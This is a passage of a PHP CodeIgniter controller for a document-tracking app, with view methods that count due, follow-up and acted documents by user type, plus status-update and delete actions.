        $date = date("Y-m-d");
        $due_num = $this->document->getDueNum($date);
        $follow_num = $this->document->getFollowNum($date);
        $acted_num = $this->document->getActedNum();
                if($acted_num==null){
                    $acted_num = 0;
                }else{
                    foreach ($acted_num as $key => $value) {
                        $acted_num = $value->count;
                    }
                }
        if($due_num==null){
            $due_num = 0;
        }else{
            foreach ($due_num as $key => $value) {
                $due_num = $value->count;
            }
        }
        if($follow_num==null){
            $follow_num = 0;
        }else{
            foreach ($follow_num as $key => $value) {
                $follow_num = $value->count;
             }
        }
        $data = array(
            'acted_num' => $acted_num,
            'due_num' => $due_num,
            'follow_num' => $follow_num,
            'details' => $this->document->getDocumentDetails(),
            'other' => $this->other->getOthers(),
            'document' => $this->document->getDocuments(),
            'compliance' => $this->compliance->getCompliance(),
            'office' => $this->offices->getOffices()
        );
        if ($this->session->userdata("user_type")==1) {
            $this->load->view('adminView/viewSearchDocuments', $data);
         } else if($this->session->userdata("user_type")==3){ 
            $this->load->view('guestView/viewSearchDocuments', $data);
         }else{
            $this->load->view('courierView/viewSearchDocuments', $data);
        }
    }

    public function viewUpdateDocuments() {
        $date = date("Y-m-d");
        $due_num = $this->document->getDueNum($date);
        $follow_num = $this->document->getFollowNum($date);
        $acted_num = $this->document->getActedNum();
                if($acted_num==null){
                    $acted_num = 0;
                }else{
                    foreach ($acted_num as $key => $value) {
                        $acted_num = $value->count;
                    }
                }
        if($due_num==null){
            $due_num = 0;
        }else{
            foreach ($due_num as $key => $value) {
                $due_num = $value->count;
            }
        }
        if($follow_num==null){
            $follow_num = 0;
        }else{
            foreach ($follow_num as $key => $value) {
                $follow_num = $value->count;
             }
        }
        $details = $this->document->getDocumentDetails();
        $other = $this->other->getOthers();
        $document = $this->document->getDocuments();
        $compliance = $this->compliance->getCompliance();
        $office = $this->offices->getOffices();
        $data = array(
            'acted_num' => $acted_num, 
            'details' => $details, 
            'other' => $other, 
            'office' => $office, 
            'document' => $document, 
            'compliance' => $compliance, 
            'follow_num' => $follow_num, 
            'due_num' => $due_num
            );
        if ($this->session->userdata("user_type")==1) {
            $this->load->view('adminView/viewUpdateDocuments', $data);
        }else if ($this->session->userdata('user_type') == 3) {
                redirect('Users/guestDashboard');
        } else{
            $this->load->view('courierView/viewUpdateDocuments', $data);
        }
    }

    public function viewUpdateComplianceForm($id){
        if ($this->session->userdata('logged_in') == null) {
            redirect('Users/index');
        } else {
            if ($this->session->userdata('user_type') == 3) {
                redirect('Users/guestDashboard');
            }else{
                $date = date("Y-m-d");
                $due_num = $this->document->getDueNum($date);
                $follow_num = $this->document->getFollowNum($date);
                $acted_num = $this->document->getActedNum();
                        if($acted_num==null){
                            $acted_num = 0;
                        }else{
                            foreach ($acted_num as $key => $value) {
                                $acted_num = $value->count;
                            }
                        }
                if($due_num==null){
                    $due_num = 0;
                }else{
                    foreach ($due_num as $key => $value) {
                        $due_num = $value->count;
                    }
                }
                if($follow_num==null){
                    $follow_num = 0;
                }else{
                    foreach ($follow_num as $key => $value) {
                        $follow_num = $value->count;
                     }
                }
                $other = $this->other->getOther($id);
                $data = $this->document->getDocument($id);
                $detail = $this->document->getDocumentDetail($id);
                $date = $this->document->getDocumentDate($id);
                $time = $this->document->getDocumentTime($id);
                $data2 = $this->compliance->getCompliance();
                $office = $this->offices->getOffices();
                $dat = array(
                    'acted_num'=>$acted_num,
                    'follow_num' => $follow_num, 
                    'due_num' => $due_num, 
                    'time' => $time, 
                    'date' => $date, 
                    'other' => $other, 
                    'id' => $id, 
                    'data' => $data, 
                    'data2' => $data2, 
                    'detail' => $detail, 
                    'office' => $office
                    );
                if ($this->session->userdata("user_type")==1) {
                    $this->load->view('adminView/updateComplianceForm', $dat);
                }else{
                    $this->load->view('courierView/updateComplianceForm', $dat);
                }
            }
        }
    }
    
    public function viewAdminDueDate() {
         $date = date("Y-m-d");
        $due_num = $this->document->getDueNum($date);
        $follow_num = $this->document->getFollowNum($date);
        $acted_num = $this->document->getActedNum();
                if($acted_num==null){
                    $acted_num = 0;
                }else{
                    foreach ($acted_num as $key => $value) {
                        $acted_num = $value->count;
                    }
                }
        if($due_num==null){
            $due_num = 0;
        }else{
            foreach ($due_num as $key => $value) {
                $due_num = $value->count;
            }
        }
        if($follow_num==null){
            $follow_num = 0;
        }else{
            foreach ($follow_num as $key => $value) {
                $follow_num = $value->count;
             }
        }
        $document = $this->document->getDocumentDue($date);
        $details = $this->document->getDocumentDetailsDue($date);
        $compliance = $this->compliance->getCompliance();
        $office = $this->offices->getOffices();
        $other = $this->other->getOthers();
        $y = array(
            'acted_num'=>$acted_num, 
            'follow_num' => $follow_num, 
            'due_num' => $due_num, 
            'other' => $other, 
            'office'=>$office, 
            'compliance' => $compliance, 
            'document' => $document, 
            'details' => $details
            );
        if ($this->session->userdata("user_type")==1) {
            $this->load->view('adminView/viewDueDate', $y);
        } else if($this->session->userdata("user_type")==3){ 
            $this->load->view('guestView/viewDueDate', $y);
         }else{
             $this->load->view('courierView/viewDueDate', $y);
        }
    }

    public function viewAdminFollowUp() {
        $date = date("Y-m-d");
        $due_num = $this->document->getDueNum($date);
        $follow_num = $this->document->getFollowNum($date);
        $acted_num = $this->document->getActedNum();
                if($acted_num==null){
                    $acted_num = 0;
                }else{
                    foreach ($acted_num as $key => $value) {
                        $acted_num = $value->count;
                    }
                }
        if($due_num==null){
            $due_num = 0;
        }else{
            foreach ($due_num as $key => $value) {
                $due_num = $value->count;
            }
        }
        if($follow_num==null){
            $follow_num = 0;
        }else{
            foreach ($follow_num as $key => $value) {
                $follow_num = $value->count;
             }
        }
        $data = array(
            'acted_num' => $acted_num,
            'due_num' => $due_num,
            'follow_num' => $follow_num,
            'document' => $this->document->getDocumentFollow($date),
            'details' => $this->document->getDocumentDetailsFollow($date),
            'compliance' => $this->compliance->getCompliance(),
            'office' => $this->offices->getOffices(),
            'other' => $this->other->getOthers()
        );
        if ($this->session->userdata("user_type")==1) {
            $this->load->view('adminView/viewFollowUp', $data);
        } else if($this->session->userdata("user_type")==3){ 
            $this->load->view('guestView/viewFollowUp', $data);
         }else{
            $this->load->view('courierView/viewFollowUp', $data);
        }
    }

    public function viewAdminActed() {

        // $other = $this->other->getOthers();
        // $document = $this->document->getDocumentActed();
        // $details = $this->document->getDocumentDetails();
        // $office = $this->document->getOffices();
        $date = date("Y-m-d");
        $due_num = $this->document->getDueNum($date);
        $follow_num = $this->document->getFollowNum($date);
        $acted_num = $this->document->getActedNum();
                if($acted_num==null){
                    $acted_num = 0;
                }else{
                    foreach ($acted_num as $key => $value) {
                        $acted_num = $value->count;
                    }
                }
        if($due_num==null){
            $due_num = 0;
        }else{
            foreach ($due_num as $key => $value) {
                $due_num = $value->count;
            }
        }
        if($follow_num==null){
            $follow_num = 0;
        }else{
            foreach ($follow_num as $key => $value) {
                $follow_num = $value->count;
             }
        }
        $data = array(
            'acted_num' => $acted_num,
            'due_num' => $due_num,
            'follow_num' => $follow_num,
            'document' => $this->document->getDocumentActed(),
            'details' => $this->document->getDocumentDetailsActed(),
            'compliance' => $this->compliance->getCompliance(),
            'office' => $this->offices->getOffices(),
            'other' => $this->other->getOthers()
        );
        if ($this->session->userdata("user_type")==1) {
            $this->load->view('adminView/viewActed', $data);
        }else if($this->session->userdata("user_type")==3){ 
            $this->load->view('guestView/viewActed', $data);
         }else{
            $this->load->view('courierView/viewActed', $data);
        }
    }

//-----------------------End of the Views--------------------------------------- //
//    >
//    >
//    >
//    >
//    >
//-----------------------Courier Views------------------------------------------ //

    public function updateStatus($id){
        if($this->session->userdata('logged_in')==null){
            redirect('Users/index');
        }else{
            // if($this->session->userdata('user_type')==2){
            //     redirect('Users/courierDashboard');
            // }
            if ($this->session->userdata('user_type') == 3) {
                redirect('Users/guestDashboard');
            } else{
                $confirm = $this->document->updateStatus($id);
                if(!$confirm){
                   $this->session->set_flashdata('message', '
                            <div class="alert alert-danger alert-dismissible" role="alert">
                                <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                <i class="glyphicon glyphicon-remove"></i>
                                Status Update failed.
                            </div>   
                        ');
                    redirect('Users/viewUpdateDocuments');
                }else{
                    $this->session->set_flashdata('message', '
                            <div class="alert alert-success alert-dismissible" role="alert">
                                <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                <i class="glyphicon glyphicon-ok"></i>
                                Document successfully acted.
                            </div>   
                        ');
                    redirect('Users/viewAdminActed');
                }
            }
        }
    }

public function deleteComplianceForm($id){
        if($this->session->userdata('logged_in')==null){
            redirect('Users/index');
        }else{
            if($this->session->userdata('user_name')!="ICT"){
                redirect('Users/courierDashboard');
            }else{
                $confirm = $this->document->deleteDocument($id);
                if(!$confirm){
                    $this->session->set_flashdata('message', '
                            <div class="alert alert-danger alert-dismissible" role="alert">
                                <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                <i class="glyphicon glyphicon-remove"></i>
                                Document deletion failed.
                            </div>   
                        ');
                    redirect('Users/viewUpdateDocuments');
                }else{
                    $this->session->set_flashdata('message', '
                            <div class="alert alert-success alert-dismissible" role="alert">
                                <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                <i class="glyphicon glyphicon-ok"></i>
                                Document successfully deleted.
                            </div>   
                        ');
                    redirect('Users/viewUpdateDocuments');
                }
            }
        }   
    }

//-----------------------End of the Views--------------------------------------- //
}
